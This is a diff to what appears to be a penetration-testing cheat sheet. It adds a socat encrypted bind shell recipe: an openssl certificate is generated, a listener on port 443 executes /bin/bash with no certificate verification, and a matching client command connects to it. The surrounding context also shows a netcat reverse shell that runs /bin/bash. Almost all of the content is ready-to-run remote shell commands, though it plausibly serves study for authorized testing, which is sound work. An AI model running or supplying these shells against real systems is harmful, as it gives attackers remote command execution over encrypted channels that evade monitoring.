@@ -44,6 +44,13 @@ nc -nv 10.11.0.22 4444 -e /bin/bash
 ```
 socat - TCP4:ip-address:80
 ```
+###### Socat encrypted bind shell
+```
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 30 -out bind_shell.crt
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+socat - OPENSSL:192.168.22.31:443,verify=0
+```
 
 ### Socat transfer files
 ```
